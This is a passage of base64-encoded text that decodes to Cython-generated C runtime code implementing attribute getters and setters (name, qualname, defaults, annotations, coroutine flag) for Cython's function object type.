sdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kb2MsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBvcC0+ZnVuY19uYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbmFtZV9fIik7CiNlbHNlCiAgICAgICAgb3AtPmZ1bmNfbmFtZSA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfbmFtZSk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19uYW1lID09IE5VTEwpKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19uYW1lKTsKICAgIHJldHVybiBvcC0+ZnVuY19uYW1lOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19uYW1lLCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgUHlfSU5DUkVGKG9wLT5mdW5jX3F1YWxuYW1lKTsKICAgIHJlc3VsdCA9IG9wLT5mdW5jX3F1YWxuYW1lOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfcXVhbG5hbWUsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpIHsKICAgICAgICBvcC0+ZnVuY19kaWN0ID0gUHlEaWN0X05ldygpOwogICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kaWN0ID09IE5VTEwpKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19kaWN0KTsKICAgIHJldHVybiBvcC0+ZnVuY19kaWN0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdF9sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgImZ1bmN0aW9uJ3MgZGljdGlvbmFyeSBtYXkgbm90IGJlIGRlbGV0ZWQiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgInNldHRpbmcgZnVuY3Rpb24ncyBkaWN0aW9uYXJ5IHRvIGEgbm9uLWRpY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kaWN0LCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZ2xvYmFscyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZ2xvYmFscyk7CiAgICByZXR1cm4gb3AtPmZ1bmNfZ2xvYmFsczsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihvcCk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgIHJldHVybiBQeV9Ob25lOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSAob3AtPmZ1bmNfY29kZSkgPyBvcC0+ZnVuY19jb2RlIDogUHlfTm9uZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlfSU5DUkVGKHJlc3VsdCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBpbnQgcmVzdWx0ID0gMDsKICAgIFB5T2JqZWN0ICpyZXMgPSBvcC0+ZGVmYXVsdHNfZ2V0dGVyKChQeU9iamVjdCAqKSBvcCk7CiAgICBpZiAodW5saWtlbHkoIXJlcykpCiAgICAgICAgcmV0dXJuIC0xOwogICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMCk7CiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX3R1cGxlKTsKICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMSk7CiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX2t3ZGljdCk7CiAgICAjZWxzZQogICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMCk7CiAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c190dXBsZSkpIHJlc3VsdCA9IC0xOwogICAgZWxzZSB7CiAgICAgICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShyZXMsIDEpOwogICAgICAgIGlmICh1bmxpa2VseSghb3AtPmRlZmF1bHRzX2t3ZGljdCkpIHJlc3VsdCA9IC0xOwogICAgfQogICAgI2VuZGlmCiAgICBQeV9ERUNSRUYocmVzKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICghdmFsdWUpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5VHVwbGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2RlZmF1bHRzX18gbXVzdCBiZSBzZXQgdG8gYSB0dXBsZSBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeUVycl9XYXJuRXgoUHlFeGNfUnVudGltZVdhcm5pbmcsICJjaGFuZ2VzIHRvIGN5ZnVuY3Rpb24uX19kZWZhdWx0c19fIHdpbGwgbm90ICIKICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c190dXBsZSwgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c190dXBsZTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgewogICAgICAgIGlmIChvcC0+ZGVmYXVsdHNfZ2V0dGVyKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfdHVwbGU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTsKICAgICAgICB9CiAgICB9CiAgICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzX2xvY2tlZChvcCk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50Cl9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAoIXZhbHVlKSB7CiAgICAgICAgdmFsdWUgPSBQeV9Ob25lOwogICAgfSBlbHNlIGlmICh1bmxpa2VseSh2YWx1ZSAhPSBQeV9Ob25lICYmICFQeURpY3RfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2t3ZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fa3dkZWZhdWx0c19fIHdpbGwgbm90ICIKICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c19rd2RpY3QsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c19rd2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHsKICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikgewogICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKG9wKSA8IDApKSByZXR1cm4gTlVMTDsKICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXN1bHQgPSBQeV9Ob25lOwogICAgICAgIH0KICAgIH0KICAgIFB5X0lOQ1JFRihyZXN1bHQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBQeU9iamVjdCogcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAoIXZhbHVlIHx8IHZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICB2YWx1ZSA9IE5VTEw7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2Fubm90YXRpb25zX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X1hJTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19hbm5vdGF0aW9ucywgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5mdW5jX2Fubm90YXRpb25zOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgcmVzdWx0ID0gUHlEaWN0X05ldygpOwogICAgICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgcmV0dXJuIE5VTEw7CiAgICAgICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSByZXN1bHQ7CiAgICB9CiAgICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgaW50IGlzX2Nvcm91dGluZSA9IG9wLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FOwogICAgaWYgKGlzX2Nvcm91dGluZSkgewogICAgICAgIFB5T2JqZWN0ICppc19jb3JvdXRpbmVfdmFsdWUsICptb2R1bGUsICpmcm9tbGlzdCwgKm1hcmtlciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pc19jb3JvdXRpbmU7CiAgICAgICAgZnJvbWxpc3QgPSBQeUxpc3RfTmV3KDEpOwogICAgICAgIGlmICh1bmxpa2VseSghZnJvbWxpc3QpKSByZXR1cm4gTlVMTDsKICAgICAgICBQeV9JTkNSRUYobWFya2VyKTsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBQeUxpc3RfU0VUX0lURU0oZnJvbWxpc3QsIDAsIG1hcmtlcik7CiNlbHNlCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TGlzdF9TZXRJdGVtKGZyb21saXN0LCAwLCBtYXJrZXIpIDwgMCkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKG1hcmtlcik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KI2VuZGlmCiAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzeW5jaW9fY29yb3V0aW5lcywgTlVMTCwgTlVMTCwgZnJvbWxpc3QsIDApOwogICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGlnbm9yZTsKICAgICAgICBpc19jb3JvdXRpbmVfdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbWFya2VyKTsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICBpZiAobGlrZWx5KGlzX2Nvcm91dGluZV92YWx1ZSkpIHsKICAgICAgICAgICAgcmV0dXJuIGlzX2Nvcm91dGluZV92YWx1ZTsKICAgICAgICB9Cmlnbm9yZToKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfQogICAgcmV0dXJuIF9fUHl4X1B5Qm9vbF9Gcm9tTG9uZyhpc19jb3JvdXRpbmUpOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKG9wLT5mdW5jX2lzX2Nvcm91dGluZSkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIH0KICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShvcCk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIGlmIChvcC0+ZnVuY19pc19jb3JvdXRpbmUpIHsKICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIH0gZWxzZSB7CiAgICAgICAgb3AtPmZ1bmNfaXNfY29yb3V0aW5lID0gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmZ1bmMsIGNvbnN0IGNoYXIqIG1lc3NhZ2UsIFB5X3NzaXplX3Qgc2l6ZSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKnB5X25hbWUgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKGZ1bmMsIE5VTEwpOwogICAgaWYgKCFweV9uYW1lKSByZXR1cm47CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMFMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSwgc2l6ZSk7CiAgICBQeV9ERUNSRUYocHlfbmFtZSk7CiNlbHNlCiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMHMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgbmFtZSwgbWVzc2FnZSwgc2l6ZSk7CiNlbmRpZgp9CnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7CiAgICBpZiAoIXB5X25hbWUpIHJldHVybjsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwUygpICVzIiwKICAgICAgICBweV9uYW1lLCBtZXNzYWdlKTsKICAgIFB5X0RFQ1JFRihweV9uYW1lKTsKI2Vsc2UKICAgIGNvbnN0IGNoYXIqIG5hbWUgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9tbC0+bWxfbmFtZTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwcygpICVzIiwKICAgICAgICBuYW1lLCBtZXNzYWdlKTsKI2VuZGlmCn0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIHJldHVybiBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19tb2R1bGVfXyIpOwp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmN